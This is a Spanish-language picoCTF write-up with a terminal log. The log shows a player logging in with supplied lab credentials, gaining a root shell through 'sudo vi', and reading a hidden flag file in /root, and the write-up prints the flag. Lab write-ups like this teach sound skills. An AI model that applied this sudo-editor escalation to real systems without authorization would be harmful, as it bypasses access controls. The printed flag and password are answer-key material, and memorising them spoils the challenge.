### Descripción
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 53696 picoplayer@saturn.picoctf.net`Password: `vCR2tuwCRm`Can you login and read the root file?
### Solución
### Solución 1 - Python
nos conectamos y buscamos archivo raiz
```
giselle_maz-picoctf@webshell:~$ ssh -p 64774 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:64774 ([13.59.203.175]:64774)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:64774' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1044-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ ls -la
total 12
drwxr-xr-x 1 picoplayer picoplayer   20 Feb 21 00:21 .
drwxr-xr-x 1 root       root         24 Aug  4  2023 ..
-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer   34 Feb 21 00:21 .cache
-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile
```
no encotramos raiz pero si un archivo root
```
picoplayer@challenge:~$ ls -la
total 12
drwxr-xr-x 1 picoplayer picoplayer   20 Feb 21 00:33 .
drwxr-xr-x 1 root       root         24 Aug  4  2023 ..
-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer   34 Feb 21 00:33 .cache
-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile


icoplayer@challenge:~$ sudo vi

root@challenge:/home/picoplayer# whoami
root
root@challenge:/home/picoplayer# cd challenge
bash: cd: challenge: No such file or directory
root@challenge:/home/picoplayer# cd root
bash: cd: root: No such file or directory
root@challenge:/home/picoplayer# ls - ]la
ls: cannot access '-': No such file or directory
ls: cannot access ']la': No such file or directory
root@challenge:/home/picoplayer# ls - la
ls: cannot access '-': No such file or directory
ls: cannot access 'la': No such file or directory
root@challenge:/home/picoplayer# ls -la
total 12
drwxr-xr-x 1 picoplayer picoplayer   20 Feb 21 05:07 .
drwxr-xr-x 1 root       root         24 Aug  4  2023 ..
-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer   34 Feb 21 05:07 .cache
-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile
root@challenge:/home/picoplayer# cat root
cat: root: No such file or directory
root@challenge:/home/picoplayer# ^C
root@challenge:/home/picoplayer# cd /    
root@challenge:/# ls -la
total 0
drwxr-xr-x   1 root   root     51 Feb 21 05:06 .
drwxr-xr-x   1 root   root     51 Feb 21 05:06 ..
-rwxr-xr-x   1 root   root      0 Feb 21 05:06 .dockerenv
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
d---------   1 root   root     27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root    340 Feb 21 05:06 dev
drwxr-xr-x   1 root   root     66 Feb 21 05:06 etc
drwxr-xr-x   1 root   root     24 Aug  4  2023 home
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root      6 Mar  8  2023 media
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 231 nobody nogroup   0 Feb 21 05:06 proc
drwx------   1 root   root     23 Aug  4  2023 root
drwxr-xr-x   1 root   root     66 Feb 21 05:09 run
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup   0 Feb 21 05:06 sys
drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
drwxr-xr-x   1 root   root     17 Mar  8  2023 var
root@challenge:/# cd /root
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 21 05:06 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat flag.txt
cat: flag.txt: No such file or directory
root@challenge:~# ^C
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
```

### Notas adicionales 
picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
### Referencias